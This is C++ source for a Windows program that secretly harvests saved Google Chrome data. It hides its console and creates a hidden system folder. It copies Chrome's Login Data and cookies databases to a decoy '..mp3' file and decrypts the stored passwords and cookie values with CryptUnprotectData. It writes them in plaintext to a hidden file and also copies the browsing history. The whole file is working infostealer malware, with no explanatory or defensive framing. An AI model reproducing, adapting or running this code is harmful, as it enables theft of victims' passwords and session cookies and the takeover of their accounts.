#include <windows.h>
#include <string>
#include <fstream>
#include "sqlite3.h"
int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	CreateDirectoryA("files", NULL);
	WinExec("attrib +S +H files", SW_HIDE);
	std::string text, nl = "\n", originurl = "origin_url:", actionurl = "action_url:", usernamevalue = "username_value:", passwordvalue = "password_value:", hostkey = "host_key:", name = "name:", value = "value:", created = "created:", expires = "expires:", lastaccessed = "last_accessed:";
	TCHAR username[100];
	DWORD size = 100;
	GetUserName((TCHAR*)username, &size);
	std::ifstream src;
	std::ofstream dst;
	sqlite3 *db;
	sqlite3_stmt *pStmt;
	int rc;
	std::string decryptedvalue;
	DATA_BLOB encryptedPass, decryptedPass;
	src.open("C:\\Users\\" + std::string(username) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", std::ios::binary);
	dst.open("files/..mp3", std::ios::binary);
	dst << src.rdbuf();
	src.close();
	dst.close();
	sqlite3_open("files/..mp3", &db);
	sqlite3_prepare(db, "SELECT origin_url, action_url, username_value, password_value FROM logins", -1, &pStmt, 0);
	rc = sqlite3_step(pStmt);
	while (rc == SQLITE_ROW) {
		encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 3);
		encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);
		memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 3), (int)encryptedPass.cbData);
		CryptUnprotectData(&encryptedPass, NULL, NULL, NULL, NULL, 0, &decryptedPass);
		decryptedvalue = (char*)decryptedPass.pbData;
		text += nl + originurl + (char*)sqlite3_column_text(pStmt, 0) + nl + actionurl + (char*)sqlite3_column_text(pStmt, 1) + nl + usernamevalue + (char*)sqlite3_column_text(pStmt, 2) + nl + passwordvalue + decryptedvalue + nl;
		decryptedvalue.clear();
		rc = sqlite3_step(pStmt);
	}
	sqlite3_finalize(pStmt);
	sqlite3_close(db);
	src.open("C:\\Users\\" + std::string(username) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\cookies", std::ios::binary);
	dst.open("files/..mp3", std::ios::binary);
	dst << src.rdbuf();
	src.close();
	dst.close();
	sqlite3_open("files/..mp3", &db);
	sqlite3_prepare(db, "SELECT host_key, name, encrypted_value, creation_utc, expires_utc, last_access_utc FROM cookies", -1, &pStmt, 0);
	rc = sqlite3_step(pStmt);
	while (rc == SQLITE_ROW) {
		encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
		encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);
		memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
		CryptUnprotectData(&encryptedPass, NULL, NULL, NULL, NULL, 0, &decryptedPass);
		decryptedvalue = (char*)decryptedPass.pbData;
		text += nl + hostkey + (char*)sqlite3_column_text(pStmt, 0) + nl + name + (char*)sqlite3_column_text(pStmt, 1) + nl + value + decryptedvalue + nl + created + (char*)sqlite3_column_text(pStmt, 3) + nl + expires + (char*)sqlite3_column_text(pStmt, 4) + nl + lastaccessed + (char*)sqlite3_column_text(pStmt, 5) + nl;
		decryptedvalue.clear();
		rc = sqlite3_step(pStmt);
	}
	sqlite3_finalize(pStmt);
	sqlite3_close(db);
	std::ofstream file("files/..b0$$", std::ios::app);
	file << text;
	file.close();
	src.open("C:\\Users\\" + std::string(username) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", std::ios::binary);
	dst.open("files/..mp3", std::ios::binary);
	dst << src.rdbuf();
	src.close();
	dst.close();
}